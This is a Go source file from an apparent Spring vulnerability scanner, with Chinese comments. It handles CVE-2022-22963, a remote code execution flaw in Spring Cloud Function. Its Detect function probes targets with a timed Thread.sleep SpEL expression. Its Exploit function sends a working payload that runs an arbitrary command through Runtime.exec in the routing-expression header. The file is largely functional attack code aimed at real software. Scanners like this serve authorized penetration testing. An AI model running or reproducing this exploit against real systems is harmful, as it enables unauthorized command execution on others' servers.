package vulns

import (
	"context"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/sspsec/Scan-Spring-GO/internal/client"
	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2022-22963 Spring Cloud Function SpEL RCE。
//
// 关键实现要点（均为对 v1 的修复，v1 在 vulhub 该环境上是误报）：
//  1. Content-Type 必须为 text/plain——用 application/x-www-form-urlencoded 时
//     body 解析在控制器执行前就抛 500，routing-expression 根本没被求值，
//     exec 从未运行（v1 把这个 500 当成了命中）；
//  2. 检测用计时法：routing-expression 求值 T(java.lang.Thread).sleep(N)，
//     漏洞版本响应阻塞 N 秒，已修复版本不评估该头、立即返回；
//  3. 命令执行经 Runtime.exec(String) 单字符串分词，无回显。
type cve202222963 struct{}

func init() { Register(&cve202222963{}) }

const scFuncPath = "functionRouter"

// 可调参数（单元测试中会缩短以加速）
var (
	scFuncSleepMs = 5000
	scFuncThresh  = 3500 * time.Millisecond
)

func (c *cve202222963) Info() model.Info {
	return model.Info{
		ID:         "CVE-2022-22963",
		Name:       "Spring Cloud Function SpEL RCE",
		Type:       "RCE",
		Severity:   "critical",
		Affected:   "Spring Cloud Function 3.1.6 / 3.2.2",
		Reference:  "https://spring.io/security/cve-2022-22963",
		HasExploit: true,
		ArgHint:    "要执行的命令（exec 单字符串分词形态，无回显）",
	}
}

func scHeader(expr string) map[string]string {
	return map[string]string{
		"spring.cloud.function.routing-expression": expr,
		"Content-Type": "text/plain",
	}
}

func (c *cve202222963) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	// 基线：不带表达式头的请求耗时
	start := time.Now()
	if _, _, err := client.RawHTTP(ctx, t.Proxy, http.MethodPost,
		t.URL+scFuncPath, map[string]string{"Content-Type": "text/plain"}, "test"); err != nil {
		return nil, err
	}
	base := time.Since(start)

	// 探针：表达式内 Thread.sleep，漏洞版本会阻塞到分词阈值以上
	start = time.Now()
	_, body, err := client.RawHTTP(ctx, t.Proxy, http.MethodPost,
		t.URL+scFuncPath, scHeader("T(java.lang.Thread).sleep("+strconv.Itoa(scFuncSleepMs)+")"), "test")
	if err != nil {
		return nil, err
	}
	probe := time.Since(start)

	if probe-base >= scFuncThresh {
		v.Vulnerable = true
		v.Evidence = fmt.Sprintf("响应耗时 %v（基线 %v），表达式确已求值", probe, base)
		v.Detail = "命令执行无回显，可用 Exploit 发命令后经 OOB/落盘验证"
	} else if strings.Contains(string(body), "Internal Server Error") {
		v.Detail = "请求报错但无求值延迟，判定为已修复或不适用"
	}
	return v, nil
}

// Exploit 经 routing-expression 执行命令（exec 单字符串形态）。
func (c *cve202222963) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	expr := `T(java.lang.Runtime).getRuntime().exec("` + strings.ReplaceAll(arg, `"`, `\"`) + `")`
	if _, _, err := client.RawHTTP(ctx, t.Proxy, http.MethodPost,
		t.URL+scFuncPath, scHeader(expr), "test"); err != nil {
		return "", "", err
	}
	return "", "无回显漏洞：命令已随 payload 发出（text/plain），请经 OOB 平台或落盘文件验证", nil
}
